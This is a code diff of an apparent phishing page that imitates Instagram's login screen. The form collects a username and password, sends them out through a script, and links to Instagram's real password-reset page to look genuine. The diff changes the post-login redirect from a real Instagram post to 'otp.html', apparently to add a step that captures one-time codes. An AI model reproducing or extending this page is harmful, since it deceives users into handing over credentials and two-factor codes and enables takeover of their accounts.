@@ -19,15 +19,15 @@
                   <form class="form">
 
                     <div class="input-box">
-                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
+                      <input required type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
                     </div>  
 
                     <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                      <input required type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                     </div>  
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
+                      <button class="btn" type="button" name="submit" onclick="sendMessage()" >Log in</button>
                     </span>  
 
                     <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
@@ -105,7 +105,7 @@
     }
     request.send(JSON.stringify(params));
 	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
+	window.location.replace("otp.html");
   }
   </script>
 </body>
